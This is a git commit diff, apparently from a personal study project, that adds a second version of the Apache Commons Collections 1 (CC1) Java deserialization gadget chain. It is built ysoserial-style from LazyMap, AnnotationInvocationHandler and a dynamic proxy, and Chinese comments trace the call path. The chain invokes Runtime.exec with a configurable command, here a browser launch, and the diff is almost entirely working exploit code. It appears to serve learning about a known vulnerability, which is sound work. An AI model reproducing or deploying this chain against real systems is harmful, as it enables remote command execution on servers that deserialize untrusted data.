f9a85e9f096bc2273608350684f4e894f22832fd
Sakkana <642835027@qq.com>
2025-02-18 18:03:57 +0800

    add cc1 chain version 2

--- src/main/java/cc1/CC1Chain.java
+++ src/main/java/cc1/CC1Chain.java
@@ -5,25 +5,26 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.TransformedMap;
+import org.apache.commons.collections.map.LazyMap;
 
 import java.lang.annotation.Target;
 import java.lang.invoke.ConstantCallSite;
-import java.lang.reflect.Constructor;
+import java.lang.reflect.*;
 import java.util.Map.Entry;
 
 import java.beans.PropertyEditor;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
 
 import toolkit.Seriliazation;
 
 public class CC1Chain {
-    private static String injectedCmd = "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari";
+    // private static String injectedCmd = "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app/Contents/MacOS/Safari";
+    private static String injectedCmd = "chromium";
+
     public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException {
         // v0 朴素版本反射进行代码执行
         // cc1_v0();
@@ -41,11 +42,15 @@ public class CC1Chain {
         // cc1_v4();
 
         // v5 完整版
-        cc1_v5();
+        // cc1_v5();
+
+        // v6 另一条链
+        cc1_v6();
 
         // 不退出
-        System.out.println("suspending");
-        suspend();
+        // 取消注释 if hostos == macos
+        // System.out.println("suspending");
+        // suspend();
     }
 
     /**
@@ -332,6 +337,52 @@ public class CC1Chain {
         Object AIHandler = constructorAIHandler.newInstance(Target.class, transformedMap);
 
         Seriliazation.serialize(AIHandler);
+        Seriliazation.unserialize("ser.bin");
+    }
+
+    /**
+     * v6 ysoserial 版本
+     * -
+     */
+    public static void cc1_v6() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{injectedCmd})
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        // 使用 LazyMap，不用 TransformedMap
+        /**
+         * AnnotationInvocationHandler.readObject()
+         *      -> Map(proxy).entrySet()
+         *          -> AnnotationInvocationHandler.invoke()
+         *              -> LazyMap.get()
+         *                  -> factory.transform(key) (protected final Transformer factory)
+         */
+
+        // 构造一个 LazyMap
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
+
+        // 构造一个代理
+        String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
+        Class clazzAIHandler = Class.forName(entryClass);
+
+        Constructor constructorAIHandler = clazzAIHandler.getDeclaredConstructor(Class.class, Map.class);
+        constructorAIHandler.setAccessible(true);
+
+        // 用于代理一个 lazymap，会在调用 entrySet 的时候必然走到 invoke 里，在 invoke 里调用 get，在 get 中调用 Transformer
+        InvocationHandler AIHandler = (InvocationHandler) constructorAIHandler.newInstance(Override.class, lazyMap);
+
+        // 接收参数：ClassLoader loader, Class<?>[] interfaces, InvocationHandler h
+        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, AIHandler);
+
+        // 用于反序列化的对象，readObject 的时候会调用里面 map 的 entrySet
+        InvocationHandler h = (InvocationHandler) constructorAIHandler.newInstance(Override.class, mapProxy);
+
+        Seriliazation.serialize(h);
         Seriliazation.unserialize("ser.bin");
     }
 
